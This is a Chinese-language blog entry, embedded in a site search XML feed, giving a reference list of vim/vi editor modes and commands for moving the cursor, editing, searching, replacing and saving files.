        <content type="html"><![CDATA[<p><img src="./medias/loading.gif" data-original="http://img.lyscholar.cn/img/1582729605358.png" alt="enter description here"></p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="vim-的基本概念"><a href="#vim-的基本概念" class="headerlink" title="vim 的基本概念"></a>vim 的基本概念</h2><p>基本上vi可分为三种操作状态，分别是命令模式（Command mode）、插入模式（Insert mode）和底线命令模式（Last line mode），各模式的功能区分如下：</p><p>1． Comand mode：控制屏幕光标的移动，字符或光标的删除，移动复制某区段及进入Insert mode下，或者到Last line mode。</p><p>2． Insert mode：唯有在Insert mode下，才可做文字数据输入，按Esc等可回到Comand mode。</p><p>3． Last line mode：将储存文件或离开编辑器，也可设置编辑环境，如寻找字符串、列出行号等。  </p><p>  vi的基本操作</p><p>?进入vi</p><p>在系统提示符号输入vi及文件名称后，即可进入vi全屏幕编辑画面：</p><p>$ vi testfile</p><p>有一点要特别注意，就是您进入vi之后是处于“Command mode”下，您要切换到Insert mode才能输入文字。初次用vi的用户都会想先用上下左右键移动光标，结果电脑一直叫，把自己气个半死，所以进入vi后，先不要乱动，转换入 Insert后再说。</p><p>?切换至Insert mode编辑文件</p><p>在Command mode下按‘i’、‘a’或‘o’三键就可进入Insert mode。这时候您就可以开始输入文字了。</p><p>i: 插入，从目前光标所在之处插入所输入的文字。</p><p>a: 增加，目前光标所在的下一个字开始输入文字。</p><p>o: 插入新的一行，从行首开始输入文字。</p><p>?Insert的切换→Command mode，按Esc键</p><p>您目前处于Insert mode，您就只能一直打字。假如您发现打错字了，想用光标键往回移动，将该字删除，就要按ESC键转换回Command mode，再删除文字。</p><p>? 离开vi及存文件</p><p>在Command mode下，可按冒号“：”键入入Last line mode，例如：</p><p>:w filename (输入“w filename”，将文章存入指定的文件名filename)</p><p>:wq (输入“wq”，因为进入之时已经指定文件名testfile，所以会写入testfile并离开vi)</p><p>:q! (输入“q!”，强制离开并放弃编辑的文件)</p><p>Command mode功能键列表</p><p>在介绍command mode指令的时后，指令后面加上“常用”字眼的功能键，表示比较常用的vi指令，请读者您一定要学会、记住。</p><p>（1）I、a、o切换进入 Insert mode。[超级常用]</p><p>（2）移动光标</p><p>vi可以直接用键盘上的光标键来上下左右移动，但正规的vi是用小写英文字母</p><p>h、 j、k、l，分别控制光标左、下、上、右移一格。</p><p>按Ctrl+B：屏幕往后移动一页。[常用]</p><p>按Ctrl+F：屏幕往前移动一页。[常用]</p><p>按Ctrl+U：屏幕往后移动半页。</p><p>按Ctrl+D：屏幕往前移动半页。</p><p>按 0 （数字零）：移动文章的开头。[常用]</p><p>按 G：移动到文章的最后。[常用]</p><p>按 w：光标跳到下个word的开头。[常用]</p><p>按 e：光标跳到下个word的字尾。</p><p>按 b：光标回到上个word的开头。</p><p>按 $：移到光标所在行的行尾。[常用]</p><p>按 ^：移到该行第一个非空白的字符。</p><p>按 0：移到该行的开头位置。[常用]<br>（3）删除文字</p><p>x：每按一次删除光标所在位置的后面一个字符。[超常用]</p><p>#x：例如，6x 表删除光标所在位置的后面6个字符。[常用]</p><p>X：大字的X，每按一次删除光标所在位置的前面一个字符。</p><p>#X：例如，20X 表删除光标所在位置的前面20个字符。</p><p>dd：删除光标所在行。[超常用]</p><p>#dd：例如，6dd表删除从光标所在的该行往下数6行之文字。[常用]</p><p>（4）复制</p><p>yw：将光标所在处到字尾的字符复制到缓冲区中。</p><p>（想在和#x、#X的功能相反）</p><p>p：将缓冲区内的字符粘贴到光标所在位置（指令‘yw’与‘p必须搭配使用）。</p><p>yy：复制光标所在行。[超常用]</p><p>p：复制单行到您想粘贴之处。（指令‘yy’与‘p’必须搭配使用）</p><p>#yy：如：6yy表示拷贝从光标所在的该行往下数6行之文字。[常用]</p><p>p:复制多行到您想粘贴之处。（指令‘#yy’与‘p’必须搭配使用）</p><p>“ayy：将复制行放入buffer a, vi提供buffer功能，可将常用的数据存在buffer</p><p>“ap：将放在buffer a的数据粘贴。</p><p>“b3yy：将三行数据存入 buffer b。</p><p>“b3p：将存在buffer b的资料粘贴</p><p>（5）取代</p><p>r: 取代光标所在处的字符：[常用]</p><p>R：取代字符直到按Esc为止。</p><p>（6）复原（undo）上一个指令</p><p>u：假如您误操作一个指令，可以马上按u，回复到上一个操作。[超常用]</p><p>.: .可以重复执行上一次的指令。</p><p>（7）更改</p><p>cw：更改光标所在处的字到字尾$处。</p><p>c#w：例如，c3w代表更改3个字。</p><p>（8）跳至指定行</p><p>Ctrl+G：列出光标所在行的行号。</p><p>#G：例如，15G，表示移动光标至文章的第15行行首。[常用]</p><p>Last line mode下指令简介</p><p>读者您要使用Last line mode之前，请记得先按Esc键确定您已经处于Command mode下后，再按冒号“：”或“/”或“？”三键的其中一键进入Last line mode。</p><p>1．列出行号</p><p>set nu: 输入“set nu”后，会在文章的每一行前面列出行号。</p><p>2．跳到文章的某一行</p><p>#：井号代表一个数字，在Last line mode提示符号“：”前输入数字，再按Enter就会跳到该行了，如：15[Enter]就会跳到文章的第15行。[常用]</p><p>3．寻找字符串</p><p>/ 关键字：先按/，再输入您想寻找的字，如果第一次找的关键字不是您相尽可能的，可以一直按n会往下寻找到您要的关键字为止。</p><p>？关键字：先按？，再输入您想寻找的字，如果第一次找的关键字不是您想要的，可以按n会往前寻找到您要的关键字为止。</p><p>4．取代字符串</p><p>1，$s/string /replae/g：在last line mode输入“1，$s/string/replace/g”会将全文的string字符串取代为replace字符串，其中1,$s就是指搜寻区间为文章从头至尾的意思，g则是表示全部取代不必确认。</p><p>%s/string/replace/c：同样会将全文的string字符串取代为 replace字符串，和上面指令不同的地方是，%s和1,$s是相同的功能，c则是表示要替代之前必须再次确认是否取代。</p><p>1,20s/string /replace/g：将1至20行间的string替代为relpace字符串。</p><p>5．存文件</p><p>w：在last line mode提示符号“：”前按w即可将文件存起来。[超常用]</p><p>#，# w filename：如果您想摘取文章的某一段，存成另一个文件，可用这个指令#代表行号，例如30,50 w nice，将您正在编辑文章的第30~50行存成nice这个文件。</p><p>6．离开</p><p>q：按q就离开，有时如果无法离开vi，可搭配“！：强置离开vi，如“q！”</p><p>qw：一般建议离开时，搭配w一起使用，如此离开时还可存文件。[常用]</p><h2 id="插入文本类命令"><a href="#插入文本类命令" class="headerlink" title="插入文本类命令"></a>插入文本类命令</h2><p>i ：在光标前<br>I ：在当前行首<br>a：光标后<br>A：在当前行尾<br>o：在当前行之下新开一行<br>O：在当前行之上新开一行<br>r：替换当前字符<br>R：替换当前字符及其后的字符，直至按ESC键<br>s：从当前光标位置处开始，以输入的文本替代指定数目的字符<br>S：删除指定数目的行，并以所输入文本代替之<br>ncw或nCW：修改指定数目的字<br>nCC：修改指定数目的行 </p><h2 id="移动光标命令"><a href="#移动光标命令" class="headerlink" title="移动光标命令"></a>移动光标命令</h2><p>h ：光标左移一个字符<br>l ：光标右移一个字符<br>space：光标右移一个字符<br>Backspace：光标左移一个字符<br>k或Ctrl+p：光标上移一行<br>j或Ctrl+n ：光标下移一行<br>Enter ：光标下移一行<br>w或W ：光标右移一个字至字首<br>b或B ：光标左移一个字至字首<br>e或E ：光标右移一个字至字尾<br>) ：光标移至句尾<br>( ：光标移至句首<br>}：光标移至段落开头<br>{：光标移至段落结尾<br>nG：光标移至第n行首<br>n+：光标下移n行<br>n-：光标上移n行<br>n$：光标移至第n行尾<br>H ：光标移至屏幕顶行<br>M ：光标移至屏幕中间行<br>L ：光标移至屏幕最后行<br>0：（注意是数字零）光标移至当前行首<br>$：光标移至当前行尾 </p><h2 id="屏幕翻滚命令"><a href="#屏幕翻滚命令" class="headerlink" title="屏幕翻滚命令"></a>屏幕翻滚命令</h2><p>Ctrl+u：向文件首翻半屏<br>Ctrl+d：向文件尾翻半屏<br>Ctrl+f：向文件尾翻一屏<br>Ctrl＋b；向文件首翻一屏<br>nz：将第n行滚至屏幕顶部，不指定n时将当前行滚至屏幕顶部。 </p><h2 id="删除命令"><a href="#删除命令" class="headerlink" title="删除命令"></a>删除命令</h2><p>ndw或ndW：删除光标处开始及其后的n-1个字<br>do：删至行首<br>d$：删至行尾<br>ndd：删除当前行及其后n-1行<br>x或X：删除一个字符，x删除光标后的，而X删除光标前的<br>Ctrl+u：删除输入方式下所输入的文本 </p><h2 id="搜索及替换命令"><a href="#搜索及替换命令" class="headerlink" title="搜索及替换命令"></a>搜索及替换命令</h2><p>/pattern：从光标开始处向文件尾搜索pattern<br>?pattern：从光标开始处向文件首搜索pattern<br>n：在同一方向重复上一次搜索命令<br>N：在反方向上重复上一次搜索命令<br>：s/p1/p2/g：将当前行中所有p1均用p2替代<br>：n1,n2s/p1/p2/g：将第n1至n2行中所有p1均用p2替代<br>：g/p1/s//p2/g：将文件中所有p1均用p2替换 </p><h2 id="选项设置"><a href="#选项设置" class="headerlink" title="选项设置"></a>选项设置</h2><p>all：列出所有选项设置情况<br>term：设置终端类型<br>ignorance：在搜索中忽略大小写<br>list：显示制表位(Ctrl+I)和行尾标志（$)<br>number：显示行号<br>report：显示由面向行的命令修改过的数目<br>terse：显示简短的警告信息<br>warn：在转到别的文件时若没保存当前文件则显示NO write信息<br>nomagic：允许在搜索模式中，使用前面不带“\”的特殊字符<br>nowrapscan：禁止vi在搜索到达文件两端时，又从另一端开始<br>mesg：允许vi显示其他用户用write写到自己终端上的信息 </p><h2 id="保存退出"><a href="#保存退出" class="headerlink" title="保存退出"></a>保存退出</h2><p>┌───────────┬───────────────┐<br>│命令　　　　　　　　　│描述　　　　　　　　　　　　　│<br>├───────────┼───────────────┤<br>│zz　　　　　　　　　　│保存并退出　　　　　　　　　　│<br>├───────────┼───────────────┤<br>│:w filename　　　　 　│写入文件　　　　　　　　　 　 │<br>├───────────┼───────────────┤<br>│:W　　　　　　　　　　│写入文件　　　　　　　　　　　│<br>├───────────┼───────────────┤<br>│:x　　　　　　　　　　│保存(如果当前文件修改过)并退出│<br>├───────────┼───────────────┤<br>│:q!　　　　　　　　　 │不保存文件，直接退出　　 　　 │<br>├───────────┼───────────────┤<br>│:q　　　　　　　　　　│退出vi　　　　　　　　　　　　│ </p>]]></content>
      
      
      <categories>
          
          <category> 编辑器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 编辑器 </tag>
            
            <tag> 大全 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
